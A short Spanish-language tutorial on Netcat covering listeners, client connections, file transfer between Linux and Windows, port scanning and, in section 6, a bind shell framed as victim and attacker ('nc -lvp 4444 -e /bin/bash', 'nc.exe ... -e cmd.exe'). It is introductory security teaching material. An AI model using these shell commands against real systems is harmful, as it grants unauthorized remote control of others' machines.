# Netcat Fundamentals

## 1. ¿Qué es Netcat?
Netcat (**nc**) es una herramienta de línea de comandos para leer y escribir datos a través de conexiones de red utilizando protocolos TCP o UDP.  
Es conocida como la **"navaja suiza" de las redes** porque permite:
- Conexiones entre máquinas.
- Transferencia de archivos.
- Creación de shells remotas.
- Depuración de puertos y servicios.

---

## 2. Funcionamiento básico
Netcat trabaja estableciendo conexiones en un puerto específico y enviando/recibiendo datos como si fuera una comunicación directa entre terminales.

**Modos de uso:**
- **Cliente** → se conecta a un host y puerto.
- **Servidor** → escucha en un puerto y espera conexiones.

---

## 3. Conexión de Linux a Linux

### En la máquina que escucha (Servidor)
```bash
nc -lvp 4444
```
- `-l` → listen (escuchar).
- `-v` → verbose (modo detallado).
- `-p` → puerto a usar.

### En la máquina que se conecta (Cliente)
```bash
nc <IP_del_servidor> 4444
```
Una vez conectadas, cualquier texto escrito en una máquina aparecerá en la otra.

---

## 4. Conexión de Linux a Windows
**En Windows (servidor):**
```powershell
nc.exe -lvp 4444
```

**En Linux (cliente):**
```bash
nc <IP_Windows> 4444
```
Funciona igual que entre Linux, siempre que Netcat esté instalado en Windows.

---

## 5. Transferencia de archivos

### De Linux a Linux
**En el receptor:**
```bash
nc -lvp 4444 > archivo_recibido.txt
```
**En el emisor:**
```bash
nc <IP_destino> 4444 < archivo_original.txt
```

### De Linux a Windows
**En Windows (receptor):**
```powershell
nc.exe -lvp 4444 > archivo_recibido.txt
```
**En Linux (emisor):**
```bash
nc <IP_Windows> 4444 < archivo_original.txt
```

---

## 6. Uso como Shell Remota

### Linux víctima (servidor con shell)
```bash
nc -lvp 4444 -e /bin/bash
```

### Windows víctima (servidor con shell)
```powershell
nc.exe -lvp 4444 -e cmd.exe
```

### Atacante (cliente)
```bash
nc <IP_víctima> 4444
```
Esto dará una shell remota del sistema víctima.

---

## 7. Escaneo de puertos con Netcat
```bash
nc -v -z <IP> 20-1000
```
- `-z` → modo de escaneo (sin enviar datos).
- Muestra qué puertos están abiertos.

---

## 8. Envío de mensajes simples
```bash
echo "Hola mundo" | nc <IP> 4444
```


